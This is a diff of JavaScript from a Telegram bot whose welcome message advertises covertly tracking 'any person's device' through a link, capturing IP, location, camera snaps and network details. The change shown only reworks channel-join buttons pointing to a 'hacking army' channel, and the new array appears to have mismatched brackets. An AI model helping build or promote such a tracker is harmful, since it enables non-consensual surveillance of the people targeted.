@@ -88,18 +88,13 @@ if (msg.text == "/start") {
 
     if (!isMemberOfAllChannels) {
       var joinMessage = `Welcome ${msg.chat.first_name} ! You can use this bot to track any person's device just through a simple link. It can gather information like IP address, location, camera snaps, battery level, network info, and a wide range of information about their device, plus many more benefits.\n\nHey user, you have to join both these channels. Otherwise, this bot will not work. If you have joined both channels, then tap the "JOINED" button below to confirm your membership.`;
-      const channelLinks = [
-  'https://t.me/RenusHackingArmy',
-  'https://t.me/RenusBotsChannel',
-  // Add more channel links here
-];
 
-const joinButtons = channelLinks.map(link => {
-  return [
-    { text: `Join Channel`, url: link },
-    { text: `Joined`, callback_data: 'start_command' }
+const joinButtons =[
+    { text: `Join Channel`, url: `https://t.me/RenusHackingArmy`},
+   { text: `Join Channel`, url: `https://t.me/RenusBotsChannel`}], 
+  [{ text: `Joined`, callback_data: '/start' }
   ];
-});
+
 
 const joinMarkup = {
   reply_markup: JSON.stringify({
